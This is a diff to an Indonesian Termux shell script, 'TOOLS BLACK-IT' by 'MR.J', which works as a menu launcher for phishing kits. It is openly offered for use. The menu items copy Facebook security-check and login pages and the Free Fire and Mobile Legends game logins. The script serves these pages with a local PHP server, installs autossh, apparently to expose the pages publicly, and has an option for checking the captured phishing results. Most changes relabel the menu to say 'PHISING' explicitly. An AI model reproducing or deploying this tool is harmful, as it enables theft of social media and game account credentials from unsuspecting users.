@@ -6,9 +6,9 @@ cy='\033[36;1m' #cyan
 me='\033[31;1m' #merah
 pu='\033[37;1m' #putih
 ku='\033[33;1m' #kuning
-toilet -f future "TOOLS-PHISING" | lolcat
+toilet -f future "TERMUX INDONESIA" | lolcat
 echo $pur"Author :MR.J"
-echo $pur"________________________________________________________________________________________________"
+echo $pur"_________________________________________________________________________"
 toilet -f future "WELCOME TO TOOLS BLACK-IT"
 toilet -f term "   /\_/\ " | lolcat
 toilet -f term " =[ •~• ]= " | lolcat
@@ -20,24 +20,25 @@ toilet -f term "| |^^^^^^^^^^^] M ••|•• M" | lolcat
 toilet -f term "| |ΩΩ=======ΩΩ]   R • R" | lolcat
 toilet -f term "| |___________|     J" | lolcat
 toilet -f term "\_|_________|_/ GUNAKAN DENGAN BIJAK!!!" | lolcat
-echo $i "BLACK-IT"
-echo $i "TOOLS-PHISING"
-echo $pur"________________________________________________________________________________________________"
+echo $pur"_________________________________________________________________________"
+echo $i "ANONYMOUS INDONESIA"
+echo $i "TOOLS-BLACK-IT"
+echo $pur"_________________________________________________________________________"
 sleep 1
 echo
 echo $i"BY MR.J TOOLS PHISING BLACK-IT"
-echo $pur"[" $ku"?" $pur"]" $ku"TERMUX_INDONESIA         |"
-echo $pur"[" $ku"?" $pur"]" $ku"HACKING ACCOUNT          |"
-echo $pur"________________________________________________________________________________________________"
-echo $pur"["$ku"1"$pur"]"$ku" INSTALL ALL MODULES NEEDED"
-echo $pur"["$ku"2"$pur"]"$ku" FACEBOOK SECURITY"
-echo $pur"["$ku"3"$pur"]"$ku" FACEBOOK LOGIN"
-echo $pur"["$ku"4"$pur"]"$ku" FREEFIRE"
-echo $pur"["$ku"5"$pur"]"$ku" MOBILE LEGENDS"
+echo $pur"[" $ku"?" $pur"]" $ku"TERMUX_INDONESIA"
+echo $pur"[" $ku"?" $pur"]" $ku"HACKING TOOLS BLACK-IT"
+echo $pur"_________________________________________________________________________"
+echo $pur"["$ku"1"$pur"]"$ku" INSTALL BAHAN-BAHAN (WAJIB)"
+echo $pur"["$ku"2"$pur"]"$ku" PHISING FACEBOOK SECURITY"
+echo $pur"["$ku"3"$pur"]"$ku" PHISING FACEBOOK LOGIN"
+echo $pur"["$ku"4"$pur"]"$ku" PHISING FREEFIRE"
+echo $pur"["$ku"5"$pur"]"$ku" PHISING MOBILE LEGENDS"
 echo $pur"["$ku"6"$pur"]"$ku" UPDATE"
 echo $pur"["$ku"7"$pur"]"$ku" CEK HASIL PHISHING"
 echo $pur"["$ku"8"$pur"]"$ku" EXIT"
-echo $pur"________________________________________________________________________________________________"
+echo $pur"_________________________________________________________________________"
 echo $pur"╭─["$pur"BLACK-IT@Root"$pur"]"
 read -p"╰─>> " pil
 
@@ -56,14 +57,14 @@ apt install autossh
 pkg install php
 echo $cy"all modules was succesfuly installed"
 sleep 4
-sh BlackIT.sh
+sh IT.sh
 fi
 
 if [ $pil = 2 ]
 then
 echo $i"Openning..."
 sleep 1
-echo $pur"now open new session and run Next.sh"
+echo $pur"TERMUX INDONESIA BLACK-IT Mr.J"
 echo $ku"__________________________________"
 sleep 1
 echo $pur"  PHISING FACEBOOK SECURITY CHECK  "
@@ -74,7 +75,7 @@ if [ $pil = 3 ]
 then
 echo $i"Openning..."
 sleep 1
-echo $pur"now open new session and run Next.sh"
+echo $pur"TERMUX INDONESIA BLACK-IT Mr.J"
 echo $ku"----------------------------------------------------------------------------------"
 echo $pur"[+]PHISING FACEBOOK MOBILE LOGIN"
 echo $pur"[+]SALIN LINK YANG ADA DI TANDA ()"
@@ -93,7 +94,7 @@ if [ $pil = 5 ]
 then
 echo $i"Openning..."
 sleep 1
-echo $pur"now open new session and run Next.sh"
+echo $pur"TERMUX INDONESIA BLACK-IT Mr.J"
 echo $ku"_________________________________"
 echo $pur"  PHISING MOBILE LEGEND"
 php -S localhost:8080 -t ~/BLACK-IT/Ml
@@ -113,9 +114,9 @@ if [ $pil = 8 ]
 then
 echo
 echo
-echo $pur "Thanks For Using This Tool"
+echo $pur "TERIMAKASIH SUDAH MEMAKAI TOOLS BLACK-IT"
 sleep 2
-echo $ku "BLACK-IT"
+echo $ku "SEE YOU BYE"
 echo
 sleep 1
 exit
